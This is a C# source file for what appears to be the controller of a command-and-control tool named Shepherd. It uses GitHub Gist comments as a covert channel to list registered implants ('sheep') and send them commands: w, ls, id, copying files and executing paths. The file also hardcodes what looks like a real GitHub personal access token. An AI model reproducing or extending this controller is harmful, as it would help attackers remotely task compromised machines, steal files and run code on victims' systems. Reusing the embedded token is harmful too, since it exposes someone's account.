using System.Text.RegularExpressions;
using ConsoleTables;
using Octokit;

namespace Shepherd.Core;

public class ShepherdController
{
    private GitHubClient _client;
    private IDictionary<string, string> _sheep;

    public ShepherdController()
    {
        _client = ConnectGitHubClient();
        _sheep = new Dictionary<string, string>();
    }

    private GitHubClient ConnectGitHubClient()
    {
        var client = new GitHubClient(new ProductHeaderValue($"shepherd"));
        var tokenAuth =
            new Credentials(
                "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");
        client.Credentials = tokenAuth;

        return client;
    }

    public async Task<IDictionary<string,string>> GetSheep()
    {
        await RefreshActiveSheep();
        return _sheep;
    }

    public async Task RefreshActiveSheep()
    {
        var comments = await _client.Gist.Comment.GetAllForGist("652bac55c3f50e604c1882abbec27c27");

        _sheep.Clear();
        foreach (var comment in comments)
        {
            var regex = new Regex(".+%.+");
            if (regex.IsMatch(comment.Body))
            {
                var parts = comment.Body.Split('%');
                var sheepId = parts[0];
                var gistId = parts[1];

                if (!_sheep.TryGetValue(sheepId, out var gist))
                {
                    _sheep.Add(sheepId, gistId);
                }
            }
        }
    }

    public async Task CommandW(string sheepKey)
    {

        var gistId = _sheep[sheepKey];
        await _client.Gist.Comment.Create(gistId, "w");
    }

    public async Task CommandLs(string sheepKey, string path)
    {
        var gistId = _sheep[sheepKey];
        await _client.Gist.Comment.Create(gistId, $"ls {path}");
    }

    public async Task CommandId(string sheepKey)
    {
        var gistId = _sheep[sheepKey];
        await _client.Gist.Comment.Create(gistId, "id");
    }

    public async Task CommandCopy(string sheepKey, string copyPath)
    {
        var gistId = _sheep[sheepKey];
        await _client.Gist.Comment.Create(gistId, $"copy {copyPath}");
    }

    public async Task CommandExecute(string sheepKey, string executePath)
    {
        var gistId = _sheep[sheepKey];
        await _client.Gist.Comment.Create(gistId, $"execute {executePath}");
    }
}